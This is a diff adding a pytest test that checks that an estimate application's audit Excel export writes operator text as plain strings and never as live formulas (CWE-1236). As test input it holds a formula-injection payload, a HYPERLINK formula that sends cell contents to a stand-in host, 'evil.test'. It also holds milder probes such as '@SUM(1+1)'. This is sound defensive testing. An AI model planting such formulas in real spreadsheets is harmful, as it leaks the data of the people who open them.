@@ -181,3 +181,47 @@ def test_export_api_endpoints(client, admin_headers, db_session):
         headers=admin_headers,
     )
     assert blocked.status_code == 422
+
+
+def test_audit_xlsx_never_emits_a_formula_element(db_session):
+    """CWE-1236: estimate text (part numbers, detail names, verification notes) is
+    operator-supplied and lands in the audit workbook verbatim. openpyxl would
+    write a leading-'=' string as a real <f> element, which Excel evaluates on
+    open. The fix is non-destructive -- the cell is pinned to a string cell, so
+    the text survives byte-for-byte and no formula element is written."""
+    import re
+    import zipfile
+
+    from app.models.estimate_workbench import QuoteFabLineItem
+    from app.services.estimate_workbench_service import get_estimate_tree
+
+    est = _seed_estimate(db_session, rfq_suffix="formula")
+    payload = '=HYPERLINK("http://evil.test/?d="&A1,"CLICK")'
+    line = (
+        db_session.query(QuoteFabLineItem)
+        .join(QuoteAssembly, QuoteFabLineItem.assembly_id == QuoteAssembly.id)
+        .filter(QuoteAssembly.quote_estimate_id == est.id)
+        .one()
+    )
+    line.detail_name = payload
+    line.part_number = "@SUM(1+1)"
+    line.verification_note = "-1+1"
+    db_session.commit()
+
+    tree = get_estimate_tree(db_session, est.id, 1)
+    pkg = db_session.query(RfqPackage).filter(RfqPackage.id == est.rfq_package_id).one()
+    xlsx = build_workbench_audit_xlsx(tree, package=pkg)
+
+    with zipfile.ZipFile(BytesIO(xlsx)) as archive:
+        for name in archive.namelist():
+            if name.startswith("xl/worksheets/"):
+                xml = archive.read(name).decode("utf-8")
+                assert re.findall(r"<f[ >/]", xml) == [], f"formula element survived in {name}"
+
+    fab = load_workbook(BytesIO(xlsx))["Fab Lines"]
+    headers = [c.value for c in fab[1]]
+    row = {h: fab.cell(row=2, column=i).value for i, h in enumerate(headers, 1)}
+    assert row["detail_name"] == payload, "the value must be preserved byte-for-byte"
+    assert row["part_number"] == "@SUM(1+1)"
+    assert fab.cell(row=2, column=headers.index("detail_name") + 1).data_type == "s"
+    assert fab.cell(row=2, column=headers.index("qty") + 1).data_type == "n", "numerics must stay numeric"
